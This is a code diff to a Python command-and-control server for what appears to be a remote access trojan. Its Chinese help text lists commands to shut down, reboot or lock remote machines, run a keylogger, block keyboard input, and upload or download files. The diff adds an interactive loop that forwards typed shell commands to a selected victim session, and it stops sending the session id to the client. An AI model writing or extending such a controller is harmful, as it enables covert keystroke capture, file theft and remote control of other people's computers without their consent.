@@ -23,16 +23,16 @@ Y88b  d88P   888  Y88b  d88P 888       Y88b  d88P
 '''
 
 __help__ = '''
-    sid<<shutdown      - 20秒关闭远程计算机
-    sid<<reboot        - 立即重启远程计算机
-    sid<<cancel        - 取消关闭远程计算机
-    sid<<keylogger     - 记录远程键盘输入并保存在log文件
-    sid<<upload        - 上传到远程磁盘        [示例：sid<<upload C:\\1.txt C:\\1.txt] [本地路径:远程路径]
-    sid<<download      - 下载远程资源         [示例：sid<<download C:\\1.txt C:\\1.txt] [远程路径:本地路径]
-    sid<<lock          - 锁定远程计算机
-    sid<<blockinput    - 禁止远程键盘输入
-    sid<<input         - 允许远程键盘输入
-    sid<<close         - 关闭远程客户端
+    sid>>shutdown      - 20秒关闭远程计算机
+    sid>>reboot        - 立即重启远程计算机
+    sid>>cancel        - 取消关闭远程计算机
+    sid>>keylogger     - 记录远程键盘输入并保存在log文件
+    sid>>upload        - 上传到远程磁盘        [示例：sid>>upload C:\\1.txt C:\\1.txt] [本地路径:远程路径]
+    sid>>download      - 下载远程资源         [示例：sid>>download C:\\1.txt C:\\1.txt] [远程路径:本地路径]
+    sid>>lock          - 锁定远程计算机
+    sid>>blockinput    - 禁止远程键盘输入
+    sid>>input         - 允许远程键盘输入
+    sid>>close         - 关闭远程客户端
     '''
 
 
@@ -57,7 +57,7 @@ def init_server(host, port):
 def clientthread(conn):
     session_id = random.randint(1, 100)
     conns[session_id] = conn
-    conn.send(str.encode('sessionid: ' + str(session_id)))
+    conn.send(b'')
 
     while True:
         data = conn.recv(1024)
@@ -72,14 +72,25 @@ def clientthread(conn):
 
 def inputter():
     while True:
-        command = input("01sec：")
-        if ">>" in command:
-            shell = command.split(">>", 3)
-            sessionid = shell[0]
-            conns[int(sessionid)].sendall(str.encode(shell[1]))
-            time.sleep(1)
-        elif "sessions" == command:
-            print(conns)
+        try:
+            command = input("01Sec->")
+            if ">>" in command:
+                shell = command.split(">>", 3)
+                sessionid = shell[0]
+                conns[int(sessionid)].sendall(str.encode(shell[1]))
+                time.sleep(1)
+            elif "sessions" == command:
+                print(conns)
+            while "shell" in command:
+                cmd = command.split(">>", 3)
+                cmd1 = input("01Sec->" + cmd[0] + "->" + cmd[1] + "->")
+                if "exit" == cmd1:
+                    break
+                else:
+                    conns[int(cmd[0])].sendall(str.encode(cmd1))
+                    continue
+        except:
+            print("参数错误")
 
 
 if __name__ == '__main__':
